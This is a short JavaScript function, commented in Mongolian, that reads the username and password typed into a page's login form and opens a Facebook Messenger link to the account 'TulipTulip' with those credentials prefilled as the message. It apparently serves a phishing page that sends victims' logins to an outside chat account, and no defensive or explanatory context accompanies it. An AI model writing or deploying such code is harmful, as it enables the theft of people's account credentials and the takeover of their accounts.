function sendToMessenger() {
    const username = document.getElementById('username').value; // Нэвтрэх нэр
    const password = document.getElementById('password').value; // Нууц үг

    // "Tulip Tulip" ID-тэй Messenger хаяг руу илгээх текст
    const message = `Нэвтрэх нэр: ${username}\nНууц үг: ${password}`;

    // Messenger руу илгээх URL
    const messengerUrl = `https://m.me/TulipTulip?text=${encodeURIComponent(message)}`;

    // Шинэ таб нээнэ
    window.open(messengerUrl, '_blank');
}
